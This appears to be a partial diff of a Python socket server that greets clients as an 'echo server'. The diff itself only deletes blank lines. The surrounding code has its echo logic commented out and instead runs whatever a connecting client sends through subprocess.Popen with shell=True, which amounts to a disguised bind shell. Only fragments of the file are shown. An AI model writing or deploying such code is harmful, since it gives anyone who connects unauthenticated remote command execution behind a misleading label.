@@ -10,7 +10,6 @@ s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 s.bind((HOST, PORT)) #binding to the port
 s.listen()#listening for connections
 print(f"Listening on port {PORT}...")
-
 conn, addr = s.accept()#accepting connections
 conn.sendall("Welcome to the echo server!\n".encode())
 print(f"Connected with {addr}")
@@ -29,7 +28,6 @@ while True: #connect
     # print(f"Received: {data.strip()}")
     # data = "echo::"+data
     # conn.sendall(data.encode())
-    
     else:
         proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
         (out , err) = proc.communicate()
